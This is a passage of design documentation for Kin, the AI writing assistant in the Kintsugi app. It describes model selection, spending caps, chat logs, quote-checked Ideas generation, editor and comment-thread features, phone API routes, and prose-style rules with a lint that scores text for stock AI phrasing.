over the model's `thinkingLevels`, hidden for a model with one level or
none; it sits beside the model in the composer and in each Settings row.

**Per conversation.** The chat's model picker sets the model for one
conversation (a thread's key, `""` for general): `kin_chat_model(topic)`,
`kin_chat_set_model(topic, model | null)` and, beside it, the effort with
`kin_chat_set_effort(topic, level | null)` (KI-77), kept in
`<vault>/.kintsugi/kin/models.json` (`ai/picks.rs`), beside that vault's
`log.jsonl` and `threads.json`, so it moves with the vault and another
vault's thread of the same name keeps its own. A turn runs on the pick of
its conversation in the vault it started in, while that provider is usable,
else on the chat default, at the conversation's effort, else the chat's
default effort. An entry is `{ provider?, model?, reasoning? }`: an effort
alone runs the chat default model at that level. The picker
(`src/kin/ModelPicker.tsx`) loads and saves its own state and reloads the
pick on `switched`.

## Cost and the cap

Every call (Kin turns, enrichment through `ai::complete`, the webview's
`ai_stream`) is priced and appended to `<config>/kin/usage.jsonl`. The cap
and model choices live in `<config>/kin/settings.json`. An isolated dev run
without `KINTSUGI_CONFIG_DIR` keeps both in memory.

- Prices come from the catalog, per model, with its input-size tiers: a
  request whose input (fresh, cached and cache-written together) is over a
  tier's size is billed at that tier's rates, as Pi computes it.
  Subscriptions (Codex, the Z.AI coding plans, OpenCode Go, Copilot, Kimi
  For Coding, the token plans) and Ollama cost $0. A model the catalog
  doesn't list under its provider is priced like the same model elsewhere,
  else high, and the month is marked estimated.
- When the month's spend reaches the cap, background work stops:
  `ai::complete` returns `AiError::CapReached`, and a background turn ends
  with `stop: "capReached"` before its next step. A turn the owner asked
  for still runs and reports `capReached: true`.
- A cancelled request's tokens are unknown and aren't recorded.

## The chat (KI-31)

Code: `ai/history.rs` (the log), `ai/chat.rs` (the live conversation),
`ai/jobs.rs` (helpers); webview: `src/kin/Chat.tsx`, `src/lib/chat.ts`.

- **One avatar, one chat.** A placeholder avatar (KI-23/KI-41 design the
  real one) sits bottom-right on every screen; it and ⌘J open the chat.
  Screens say what they show through `useScreenContext` (the editor: the
  selection, then the document; an open clip), and the chat attaches it as
  removable chips. `discuss(chip)` from `src/lib/chat.ts` opens the chat with
  an item pinned first: clips use it, and the Feed's Discuss (KI-25) calls it
  with `{ kind: "feed", path: <item id>, label: <title> }`.
- **One log per vault (KI-59).** `<vault>/.kintsugi/kin/log.jsonl`,
  append-only and never shortened, beside `.kintsugi/comments/` and Kin's
  memory. Hidden like them, so Kin's tools, search and the phone's library
  never see it, and the watcher ignores it. Each owner message's topic is inferred: the
  first chip's subject (a paragraph belongs to its document), else a known
  thread the message names, else the previous topic if it was under 30
  minutes ago, else general. A thread is the entries sharing a topic, with a
  running summary in `threads.json` (beside the log); opening the chat on
  draft X shows X's thread, and the next turn sends X's summary and recent
  exchanges.
- **Switching vaults switches the conversation.** The engine opens the open
  vault's log on first use after a switch (`vault_open` also asks it to at
  once): the running turn and comment replies stop, the chat and comment
  margins reload (`kin:chat` `switched`), and history, summaries and the
  phone's routes all read the new vault's log. A turn, review or helper job
  that finishes after the switch writes to the log of the vault it started
  in. The job table and spend stay in app data, shared by every vault.
- **Moving the old log (KI-59).** Before KI-59 one log in
  `<config>/kin/conversation/` served every vault. The first time a log is
  opened after the update, it moves into that vault (the one open, or last
  used); other vaults start empty. `history::migrate` claims it by renaming
  the folder to `conversation.moving/` (a backup no other vault picks up),
  copies `threads.json` then `log.jsonl` into the vault atomically, reads
  the copy back to check it starts with every byte of the old log, and only
  then deletes the backup. A crash at any step leaves the old log whole and
  the next launch finishes the move. A vault that already has a log of its
  own is never overwritten: the old one is set aside as
  `conversation.unmoved-<time>/` instead.
- **Batching and interrupts.** Messages land in the log at once. Kin answers
  1.2 s after the last message, every waiting message in one turn. A keystroke
  (`kin_chat_typing`, throttled) or a new message cancels the running turn;
  its partial reply is logged as interrupted, and its messages are answered
  by the next turn, 3.5 s after typing stops or 1.2 s after the next message.
  Stop ends the turn and settles its messages.
- **Idle summaries.** Two minutes after the last activity, threads with six
  or more new entries get a new running summary from the chat model. It's
  background work: it stops at the cap and when he comes back.
- **Helper jobs.** `kin_job_create({ kind, brief, task?, topic? })` (or
  `jobs.create` in `src/lib/chat.ts`) records a job in `<config>/kin/jobs.json`
  and runs it as its own agent: one at a time, `background: true` (so it
  waits as `waiting` at the cap and resumes when a cap change or the
  five-minute check allows), with only its brief plus the memory snapshot
  (`about::snapshot`) in the prefix, and no memory-writing tools. Chat turns
  take a fresh snapshot and can update memory like any conversation. A job running when the app quit is queued again on start. It
  reports back as a helper entry in the log (a dot on the avatar, no
  popup). Feed ranking and Ideas are meant to use this. Helpers get 16k
  output tokens per call (chat turns 4k): a batch of ideas is long, and a
  reasoning model's thinking counts against the same budget. Each run's step
  trace (tools called, stop reason, text length and output tokens per call;
  no content) is kept on the job in `jobs.json` and printed to stderr as a
  `kin: helper …` line, and a helper that ends without a report says why
  (out of steps, its reply spent on thinking, or empty).
- Headless runs never start the daily Ideas batch on their own unless
  `KINTSUGI_HEADLESS_IDEAS_DAILY=1`, so a real-AI smoke test spends nothing
  unasked; `ideas_generate` (the phone's "Ask for more") still works. `KINTSUGI_HEADLESS_WIRE_TRACE=1` prints
  each model request's shape (item kinds, reasoning items carried, stop
  reason, output tokens; never content) to stderr.
- Headless runs can try it all without a provider: `KINTSUGI_HEADLESS_KIN=mock`
  swaps in a scripted local model that reads the first chip (a document,
  clip or `feed:<id>`), or calls `shortlist` when asked for one, or searches
  the web (scripted) when asked about the web, or searches,
  then answers slowly, word by word, quoting the start of what the tool returned. `KINTSUGI_HEADLESS_KIN_IDLE_MS` shortens
  the idle wait. `test/runtime-kin.test.ts` drives it in headless Chromium.
  For the chat's design states (KI-79) it also answers by how a message
  starts: "Think" waits 3 s before it does anything, "Compare" runs a search
  and a list in one step and then reads two documents together, "Tighten"
  (or "Rewrite", "Edit") on a selected paragraph proposes an edit, "Fail"
  fails like a provider error and "Timeout" like a provider that stopped
  responding; "points" anywhere in it gets an answer in Markdown. `pnpm --filter @kintsugi/desktop
  kin:scenarios` (`test/kin-scenarios.ts`) walks through every state on a
  fresh scratch vault, with a long conversation seeded into General, and
  screenshots each one in light and dark.

### The chat's interface (KI-79)

Code: `packages/ui/src/components/ai/` (`@kintsugi/ui/ai`), the chat
components; `src/kin/useKinChat.ts` (the chat's state), `Conversation.tsx`
(the log, helpers and composer) and `Chat.tsx` (the floating pane and the
avatar). The components follow the structure of Vercel's AI Elements
(Conversation, Message, Response, PromptInput, ChainOfThought, Suggestion,
CodeBlock, Shimmer), rebuilt on the Graphical theme and Base UI parts.
They know nothing about Kin and nothing about where they're placed, so the
pane, a sidebar (KI-63) or a comment thread can use them.

- **The log** follows new words while he's at the bottom, stays put when
  he's scrolled up to read, and shows a button back to the latest. Opening
  the chat or another thread starts at the bottom.
- **Kin's reply** is Markdown, rendered without HTML. Vault paths and
  `[[links]]` in it open the document or clip (`kintsugi:open-link`, handled
  in `App.tsx`); web links open in the browser.
- **While Kin works** it says "Thinking" until it does something, then lists
  each tool call as it runs ("Searched “repair”", "Read drafts/x.md") with its
  status, then streams the reply with a caret. Done, the steps fold into
  one line ("3 steps · 6s", or "Thought for 4s" with none), which opens to
  the list. The reply keeps them in the log entry: `tools` (name, arguments
  with long strings cut, whether it failed; at most 24), `ms` (how long the
  turn took), `model` and `capReached`. None of it is sent back to the
  model.
- **Under a reply**: its web sources, Copy, and the model and cost, shown on
  hover (always on the latest reply).
- **Errors** say what failed: "Kin couldn’t answer" with the provider's
  message, or "The model stopped responding" for a timeout, each with Try
  again (it sends the messages the reply answered again). A reply that ran
  with the month's cap reached says so, with Change cap.
- **Edits.** When he asks Kin to edit a passage, Kin proposes it as a fenced
  `edit <path>` block of search/replace pairs (the prompt asks for this; see
  `prompt.rs`). The chat shows it as a word diff with Apply, which replaces
  the passage in the open document as one undoable change
  (`replaceInDocument` in `src/lib/insert.ts`, registered by the editor), and
  Undo. Apply waits until the passage is in the document exactly once; with
  the document closed, the button opens it. Nothing is written until he
  applies it.
- **An empty thread** shows one line and, with something on screen, a few
  asks to send in one click ("Who disagrees?", "Find a clip").
- **Helpers** at work sit above the composer, each with a way to stop it.
- **Hide.** The pane's minus button and ⌘J hide it; the conversation and
  Kin's turn carry on, and the avatar's dot says when Kin replied.
- **Motion** is small and has a reduced-motion fallback: messages he sends
  and helper reports settle in from just below, a step fades in as it
  starts and its spinner turns into a check, "Thinking" shimmers, the caret
  pulses, and the button back to the latest fades in. Opening the pane
  isn't animated (⌘J opens it many times a day).

## Ideas (KI-39)

Code: `ai/ideas/` (store, grounding, briefs, Adopt); webview: `src/ideas/`.
Ideas opens from the sidebar or ⇧⌘E.

- **A helper makes them.** A batch is a helper job of kind `ideas` on the
  `ideas` model task, so it is background work and waits at the monthly
  cap. Once a day (checked shortly after start, then every half hour) Kin
  asks for up to five, if a model for Ideas is set up and the cap allows;
  "Find ideas for this draft" (and the phone's "Ask for more") ask for up to
  three on demand. The brief (`ideas/brief.rs`) carries the rules (never
  draft prose; the hunch and 1–3 observed facts; 2–3 verbatim quotes, cited
  inline as `[1]`, `[2]` instead of a separate justification), the titles
  offered in the last two weeks, what Hussain did with earlier ideas, and
  the Feed items he liked, noted or saved. The helper searches and reads
  with Kin's tools and replies with JSON between `<ideas>` tags.
- **Checked before he sees them** (`ideas/ground.rs`). Every quote must
  appear in the vault file or Feed item it names (typographic quotes,
  spacing, emphasis and blockquote markers aside; `…` marks an omission).
  One quote that isn't there drops the whole idea, as do fewer than two
  quotes, hidden or outside paths, a hunch with paragraphs, headings or
  lists, and over-long fields. A citation with no quote behind it is
  removed. What was dropped, and why, goes in the helper's
  report in the conversation log. The footprint (searches, files read,
  seconds, cost) comes from the run itself, not from the model.
- **App data, not the vault.** `<config>/kin/ideas/<vault key>/ideas.json`
  (rewritten atomically) and `signals.jsonl` (append-only): dismissed (with
  optional reasons), undismissed, a reason removed or restored, adopted,
  discussed, refined, refine undone, and faded (unused for a week, a weak
  negative signal). The next brief reads the newest 40 back.
- **Fading** is computed: fresh for three days, thinner until day seven,
  then "faded this week" until day fourteen. Unused ideas are deleted after
  30 days. Adopted ideas never fade. Headless runs can move the clock with
  `KINTSUGI_HEADLESS_IDEAS_DAYS_AHEAD=<days>`.
- **Adopt** is the one vault write, and only on his click: a new draft in
  `drafts/` (if the vault has one) with the working title, an empty body and
  the idea in frontmatter, or the idea added to a draft's frontmatter
  without touching its body or other fields:

  ```yaml
  ideas:
    - id: idea-20261101-090000-1
      from: kin
      offered: 2026-11-01
      title: "You've written about what repair is, never what it costs"
      hunch: "The essay you haven't written is the cost side…"
      clips:
        - "[[posts/on-craft]]"
        - "[[inspiration/golden-joinery]]"
  ```

  A draft never links to itself; Feed quotes aren't clips and stay out of
  the list. An open draft sees the change through `vault:changed`, and the
  idea and its clips sit beside it (`src/ideas/Beside.tsx`). The reference
  index reads those clip links as edges (`idea_clip_links` in
  `crates/vault/src/references.rs`), so the draft shows under each clip's
  Used in.
- **Refine** is a helper job of kind `ideas-refine` with the idea and his
  request. The result passes the same checks, replaces the idea and keeps
  the earlier version; Undo restores it. **Discuss** opens the chat with an
  `idea` chip; Kin reads it with the `idea` extra tool; it's the way to
  talk about an idea.
- **An open idea** (KI-76) shows the hunch and its takeaways, nothing else.
  Each `[n]` reveals its quote and source on hover or click; quotes nothing
  cites (all of them, for ideas from before citations) hang off the end of
  the hunch. Older ideas keep their stored steps and reasons, unshown.
- **Ideas for this draft.** `openIdeas(path)` / `ideasForDraft(path)` in
  `src/ideas/api.ts` open Ideas filtered to ideas about, quoting or adopted
  into that document. The editor footer has an "Ideas" link, and ⌘K's
  "Ideas for this draft" calls the same function.
- **The layout** is KI-22's Ledger (`src/ideas/Ledger.tsx`), the only
  layout-specific file: `useIdeas` and `parts.tsx` serve any layout, so Desk
  or Letter is a sibling file swapped in `Ideas.tsx`.
- Headless: `KINTSUGI_HEADLESS_KIN=mock` makes ideas too. The scripted
  helper searches, reads the top documents and offers ideas quoting them,
  plus one with an invented quote that the checks must drop.
  `test/runtime-ideas.test.ts` drives it in headless Chromium.

## In the editor (KI-37)

Code: `packages/editor/src/commands.ts` (`/`), `references.ts` (`[[` and
`@`), `menu.ts` (their shared look); webview: `src/refine/` (⌘K) and
`src/references/Writing.tsx` (the wiring).

- **`/`** at a line start or after a space opens the block menu: Markdown and
  MDX blocks that turn the line into a heading, list, to-do, quote, callout
  (`> [!NOTE]`), code block, divider, table, image, footnote or `<Component />`,
  as one undoable change. Skills with `command: true` (`kin_skills`) follow
  under "Kin skills"; one runs on the paragraph (or, on a blank line, the one
  above) through ⌘K's rewrite path, so the result is a diff he accepts with
  Enter. Nothing is written until then. Host actions (`Commands.actions`)
  come last under "Kin": the desktop adds *Ideas for this draft*.
- **`@`** opens the `[[` picker and writes the same `[[link]]`; title matches
  lead in both. **Kin** is first while the query could be "kin": choosing it
  takes `@Kin` back out and calls `References.onKin(anchor)` with the
  paragraph's range, which the desktop turns into a comment thread on that
  paragraph (KI-38, below). `@` never
  opens mid-word (email addresses), and a space closes it unless a title still
  matches, so "@karpathy said" stays prose.
- **⌘K** (the selection, else the paragraph) keeps its edits and lists the
  command skills, then Kin's actions, which write nothing themselves: *Find
  supporting clips* (one `clip_search` per paragraph term, ranked by terms
  matched; choosing one adds its link after the passage), *Who disagrees?*
  (sends that question to the chat with the paragraph, via
  `discuss(chips, text, { send: true })`), *Discuss this paragraph* (opens a
  comment thread's composer on it, unsent), *Kin, review this draft* and
  *Ideas for this draft* (`ideasForDraft(path)`).
  In a read-only mirror (KI-9) only the actions that write nothing are
  offered, and a supporting clip can only be opened.
- **Keys of their own (KI-85).** Tighten ⌥⌘T, Rephrase ⌥⌘R, Simplify ⌥⌘P,
  Fix grammar and spelling ⌥⌘F and Synonyms ⌥⌘S run on the selection (else
  the paragraph) without ⌘K's list, and land in the same review: a diff to
  accept with Enter. ⌘K's rows show these keys. One chord beats a letter
  inside ⌘K: it works from the selection in one step, and a typed instruction
  can still start with any letter. Synonyms need four words or fewer; a
  read-only mirror refuses them.
- **Right-click on a selection** (or ⇧F10, or the context-menu key) opens
  `src/refine/SelectionMenu.tsx`: those edits, *Dim* (⌘/, KI-88), *Edit with Kin…* (⌘K), *Ask
  Kin* (⌘J; the chat with the passage attached), then Cut and Copy, each row
  with its key. A right-click anywhere else keeps the Mac's menu and its
  spelling suggestions. Alternatives and stash (KI-86, KI-89) add their rows;
  their keys are already held in `src/lib/shortcuts.ts`.
- **Phone width.** Both menus fit `100vw − 16px`, rows are at least 44 px
  on a coarse pointer, and touch hints replace the key hints there.
- **Headless.** With `KINTSUGI_HEADLESS_KIN=mock`, `ai_providers` offers the
  first edit model as `mock` and `ai_stream` answers with `scripted::edit`
  (drops filler words), so ⌘K and skills can be reviewed without a provider.
  `test/runtime-editor.test.ts` drives all of it in headless Chromium.

## Comment threads (KI-38)

Code: `packages/editor/src/anchors.ts` (anchoring, pure) and `comments.ts`
(the CodeMirror extension); `ai/comments.rs` (storage) and
`ai/chat/comments.rs` (turns, review, commands); webview: `src/comments/`.

- **Starting one.** `@Kin` in a paragraph and ⌘K's *Discuss this paragraph*
  open a composer on the paragraph (`startComment`). Nothing is saved until
  he sends; Escape leaves nothing behind. *Kin, review this draft* (⌘K, the
  `/` menu's Kin actions, or the comments bar) is one turn that reads the
  document and leaves up to five threads on the paragraphs that most need a
  note. Kin's reply comes back as `<comments>[{"paragraph": n, "comment": …}]</comments>`
  against a numbered list of the body's paragraphs; anything else is logged
  as a failed review and leaves no threads.
- **The familiar UX.** A marker in the right margin of each commented
  paragraph (a count when there are several), a popover with the thread
  (reply, Resolve/Reopen, Stop while Kin is replying, Ask again after a
  failed or stopped reply), and a comments bar under the editor with counts,
  *Show resolved*, the review action and the detached threads. Kin's
  messages carry KI-23's Kin accent colour (`--kin`, `--kin-ink` in `@kintsugi/ui`) and
  the placeholder avatar (the host's `kinMark`; KI-41 replaces it).
- **References.** Any `[[link]]` or vault path in Kin's reply is a chip:
  drag it into the draft (the same drop as the reference margin), tap `+` to
  add it after the paragraph's last word, or click to open it. Nothing else
  of Kin's ever lands in the document.
- **Stored outside the document.** `.kintsugi/comments/<document path>.json`
  in the vault, one file per document: each thread's id, anchor, status,
  origin and whether it's detached. Renaming or moving a document (or its
  folder) moves its file. The MDX is never touched.
- **Anchors.** A text quote of the paragraph with up to 48 characters of
  context either side and its first line. On open it's re-resolved: the exact
  quote (the occurrence whose context and line fit best), else the most
  similar paragraph (word overlap ≥ 0.5), else none. While the document is
  open, CodeMirror's change mapping moves it and snaps it to the paragraph
  its start is in, so typing inside or above it, merging or splitting keep it
  on its paragraph. The editor sends the new quotes back after 0.7 s.
- **Orphans.** Deleting a paragraph outright detaches its threads. They are
  kept with the last text they were on (shown as "Was on: …") and their
  messages, listed in the comments bar, and still answerable; an undo, or a
  paragraph with that exact text later, re-attaches them.
- **One log.** A thread's messages are rows in the conversation log with
  the document as their `topic`, the thread's id in `comment` and the
  paragraph as a chip (with its current lines). The chat shows them in the
  document's thread, tagged "Comment on a paragraph", and `history` finds
  them. Each thread has its own turns (not the chat's batching): the
  thread's exchanges are the turn's history, a new message interrupts its
  running reply and the next answers both, and comment replies don't light
  the chat's unread dot. The review's request and Kin's note on it are
  `review: true` rows.
- **Phone.** All of the UI is plain DOM in `packages/editor`, sized for a
  phone (the popover fits `100vw − 16px`, larger markers on a coarse
  pointer), behind the `comments` prop on `Editor`, so the phone's shared
  editor can adopt it with a host like `src/comments/useComments.ts`.
- **Headless.** With `KINTSUGI_HEADLESS_KIN=mock` the scripted model answers
  comment turns (searches the paragraph's longest word, replies naming the
  first hit as a `[[link]]`) and reviews (comments on the first and last
  paragraphs). `test/runtime-comments.test.ts` drives it all in headless
  Chromium.

## On the phone (KI-42)

Kin runs on the Mac; the phone reads and asks through the phone API
(version 6, `phone/sections.rs`, each route the Mac's own command through
`phone/desk.rs`). No key, model call or prompt is ever on the phone.

| Route | Command |
| --- | --- |
| `GET /v1/kin?before&limit` | `kin_chat_log` over every thread of the open vault's log (limit 1–500, default 100) |
| `POST /v1/kin {id, text, chips}` | `kin_chat_send`, once per `id`: `{entry, duplicate: false}`, or `{seq, duplicate: true}` for an id already sent. The last 500 ids are kept in `<config>/phone-kin-ids.json`, so a resend after a restart still lands once. Chips are `doc`, `clip`, `feed` or `idea` (others are 400) |
| `POST /v1/kin/stop` | `kin_chat_stop` |
| `GET /v1/kin/jobs` | `kin_jobs` |
| `GET /v1/ideas` | `ideas_list` |
| `POST /v1/ideas/more` | `ideas_generate` (no focus): "Ask for more" |
| `POST /v1/ideas/adopt {id, title?}` | `ideas_adopt` into a new draft; an idea already adopted answers with its draft, so a retried Adopt never makes a second one |
| `POST /v1/ideas/dismiss {id, undo?}` | `ideas_dismiss` / `ideas_undismiss` |
| `POST /v1/ideas/discussed {id}` | `ideas_discussed` |

**The phone app.** One avatar (`components/KinAvatar.tsx`, the Mac's
placeholder bowl) floats bottom right on every screen but the chat and
pairing, and hides while typing. Screens say what they show with
`useScreenContext` (`lib/screen-context.ts`): a document, a clip, a feed
item being read, an open idea. Tapping the avatar opens the chat
(`app/kin.tsx`) with those as removable chips.

- **Offline.** Messages are written to a queue on the phone first
  (`lib/kin.ts`, with a UUID each) and sent in order when the Mac answers.
  While it doesn't, the chat says "Kin runs on your Mac, which isn't
  reachable", each waiting message says "Waiting for your Mac", and they go
  when it's back (the next sync from any screen). A message the Mac refuses
  stays, marked, with Try again and Discard.
- The conversation (the latest 100 entries, every thread, with thread labels
  where the subject changes and paragraph comments tagged) and the jobs are
  kept to read offline. While Kin is answering the chat asks every 1.5 s
  (else every 6 s); replies arrive whole, not streamed. "Kin's jobs on your
  Mac" lists running and recent helper jobs.
- **Ideas** (`app/ideas.tsx`, `lib/ideas.ts`): the Ledger
  (`components/ideas/Ledger.tsx`, the only layout-specific file;
  `components/ideas/parts.tsx` serves any layout). A row opens in place:
  the hunch and what Kin noticed, with inline citations (tap one for its
  quote; tap the quote to open the document or clip), then Adopt, Discuss and Dismiss
  (with Undo). Adopt, Dismiss and Ask for more wait for the Mac like Kin's
  messages; an adopted draft is fetched into the phone's library and opens.

**Testing.** `cargo test -p kintsugi phone::` covers the routes against a
stand-in app; with `--no-default-features --features headless`,
`phone::dev::the_phone_reaches_the_real_feed_ideas_and_kin` drives them
against the real app on a scratch vault with the mock model. The phone's
stores are tested in `apps/mobile/src/lib/sections.test.ts`, and
`apps/mobile/test/browse-acceptance/run.sh` with `ONLY=sections` runs the
XCUITest (screenshots in `docs/screenshots/ki-42/`).

## Kin's writing (KI-102)

How Kin writes the prose Hussain reads: Feed story summaries, Ideas, chat
replies, margin notes and reviews, clip summaries and the chat's running
summary. [Voice](voice.md) governs the app's own copy; this governs Kin's
prose. Code: `ai/writing.rs`, the rules in `ai/writing/rules.json`.

### The tone

Settings › Kin and models › Kin has one menu, "Tone for summaries and
ideas", saved with Kin's settings (`tone` in `settings.json`; Plain when
unset). Story summaries and Ideas (new batches and refinements) follow it.
The chat keeps Kin's own voice, a sharp, direct friend, and edits of
Hussain's text keep his. There is no per-item tone.

Each preset reaches the model as an instruction block after the rules, and
its key constraint again as the prompt's last line, because models drift from
rules stated once (Readwise's Ghostreader prompts do the same). Instructions
only: the example sentences below are for this page, not the model, so their
content can't leak into a summary.

| Tone | Instruction | Reads like |
|---|---|---|
| Plain (default) | The thing itself, in ordinary words and short sentences. Facts first, no wind-up, no adjectives doing the work of evidence. | Anthropic shipped a smaller model today. It costs a third as much and matches the old one on most benchmarks. |
| Editorial | A magazine brief: the point first, then why it matters in one attributed sentence. No scene-setting, no moral. | The merger clears its last regulator in March, which leaves the two biggest suppliers under one owner. |
| Casual | How you'd tell a friend what you read: contractions, first person where it fits, no jargon you wouldn't say out loud. | I read four takes on this and they all missed the boring part: nobody can afford the hardware. |
| Dry | Understate. State the fact and stop. No enthusiasm, no irony, no exclamation marks. | The feature shipped. It is slower than the one it replaced. |

A new tone applies to what Kin writes next: new stories, stories that gain
an article and are summarised again, and new or refined ideas. What's
already written stays; nothing is regenerated, so changing the menu never
spends money on its own.

The headless mock follows the tone too, so each one can be seen at $0:
`pnpm --filter @kintsugi/desktop exec node test/writing-tones.ts` picks each
tone in turn, asks for ideas, follows the news fixture feeds and saves the
setting, an idea and a story per tone to `.headless/ki102-tones/`
(screenshots in `docs/screenshots/ki-102/`).

### The rules

One block, in every prompt that writes prose: the chat's fixed prefix (so
also comments, reviews and Ideas, which run through it), the story
summariser, clip enrichment's summary and the running summary. The editor's
edits (⌘K, alternatives and `/` skills) read the same file
(`src/refine/prompts.ts`) and are told never to introduce any of it into
his passage, and to keep what the passage already uses.

The key idea is **variance over substitution**: even rhythm and empty claims
are what make text read as generated, and swapping one stock word for
another relocates the tell without fixing it. Fix the thought. And **never
invent a specific**: every number, name, date and quote comes from the
sources.

P0, never, whatever the tone:

- Inflated significance (`stands as`, `a testament to`, `pivotal`, `underscores`, `reflects broader trends`).
- Stock AI words (`delve`, `tapestry`, `myriad`, `plethora`, `realm`).
- A trailing `-ing` clause posing as analysis (`, highlighting…`, `, ensuring…`).
- Negative parallelism (`not only X but also Y`, `it's not X, it's Y`).
- A summing-up opener (`In summary`, `In conclusion`, `Ultimately`, `Overall`).
- Chat residue (`I hope this helps`, `Let me know if`, citation tokens, `[placeholders]`).
- A number, name, date or quote that isn't in the sources.

P1, avoid unless the source says it: lists of three, lazy extremes
(`every`, `always`, `never`), `serves as` and `boasts` for "is" and "has",
filler adverbs (`really`, `just`, `actually`), throat-clearing
(`Here's the thing`, `At its core`), vague attribution and stacked hedges,
false agency, em dashes, meta-commentary, promotional words, rhetorical
questions, colon reveals, bold scattered through prose and `**Term:**`
lists, decorative emoji, three sentences of the same length in a row,
quotable one-liners and lesson endings, synonym cycling, title-case
headings, and metaphors of `gold`, `seams`, `craft` or `journeys`.

### The slop lint

`ai/writing/lint.rs` (tests only) scores text from 100 down: zero P0 hits;
P1 hits at most about 2 per 100 words, and no one phrase repeated more than
once per 150 words; at most 1 em dash and 1 "x, y and z" list per 100 words
(one of each is always fine); no emoji; and from four sentences up, sentence
lengths that vary by at least 0.2 of their mean. Every hit costs points
inside the budget too, so a regression shows in the score before it fails.

`cargo test` runs it over three corpora in `ai/writing/corpus/`:

- `kin/`: recorded Kin output, which must pass and keep its mean score above
  a baseline. Today it holds the headless mock's output (stories and ideas
  in every tone, a chat answer, a margin note, a review, the running summary
  and an edit). The headless tests (`--features headless`) lint the mock's
  live output and fail if it no longer matches what's frozen; record it again
  with `KINTSUGI_RECORD_WRITING=1`. To add real output, run
  `cargo test -p kintsugi live_writing -- --ignored --nocapture` with a
  provider set up: it summarises fixed articles in each tone with the triage
  model and, with `KINTSUGI_RECORD_WRITING=1`, saves them as
  `kin/live-stories.json`.
- `slop.json`: one sample per tell, which must fail.
- `human.json`: public-domain prose (Strunk, Thoreau, Darwin, Franklin,
  Emerson) and a sample for each of humanizer's do-not-flag cases (one em
  dash, curly quotes, one passive, one tricolon, formal words, numbers,
  self-correction, mixed feelings, swings in sentence length), which must
  pass, so the lint doesn't over-flag.

### Credit

The rules adapt [stop-slop](https://github.com/hardikpandya/stop-slop) by
Hardik Pandya (MIT) and [humanizer](https://github.com/hannsxpeter/humanizer)
by hannsxpeter (MIT), including humanizer's restraint notes, which set the
lint's budgets. [Wikipedia's "Signs of AI
writing"](https://en.wikipedia.org/wiki/Wikipedia:Signs_of_AI_writing)
(CC BY-SA 4.0) informed the list; its tells are paraphrased, not copied.
Orwell's "Politics and the English Language", Strunk's *The Elements of
Style* and Paul Graham's [`Write Simply`](https://paulgraham.com/simply.html) are behind the plain-words
rule.

## Settings

Settings is a page (`src/settings/`, KI-61). ⌘, or the sidebar opens it
over the app, at the section last shown; Esc, ⌘[ or Back returns to where
he was. Its sections:

- **General**: the vault, and optional tools.
- **Appearance**: Light, Dark or System, editor text size and the current font
  ([appearance](appearance.md)).
- **Kin and models**: the default model for chat, Ideas, edits,
  completions and Feed triage; this month's spend by task and the monthly
  cap; the tone for summaries and ideas (above, Kin's writing); About you
  and the developer panel.
- **Providers**: where each credential comes from (above, Credentials),
  for the providers the default models use and any other with a
  credential, plus any he picks with "Add a provider"; per provider, add,
  replace or remove a key saved in Kintsugi, or sign in and out.
- **Web**: web tools on or off, the search provider and each one's key
  (above, The web).
- **Phone**, **Blog**, **Export** and **Privacy** (the privacy statement,
  which says keys and sign-ins are saved on this Mac).

⇧⌘K opens a minimal developer panel to run one turn (with a "don't
remember this" box).
